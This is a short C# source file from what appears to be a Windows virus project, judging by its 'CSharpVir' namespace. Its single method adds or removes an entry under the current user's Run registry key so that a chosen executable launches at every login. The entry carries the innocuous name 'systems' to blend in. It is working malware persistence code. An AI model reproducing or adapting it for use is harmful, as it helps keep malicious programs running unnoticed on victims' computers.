using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;

namespace CSharpVir
{
    class Autorun
    {
        internal static bool SetAutorunValue(bool autorun, string mpath)
        {
            const string name = "systems";
            string ExePath = mpath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                    reg.SetValue(name,ExePath);
                else
                    reg.DeleteValue(name);
                reg.Flush();
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
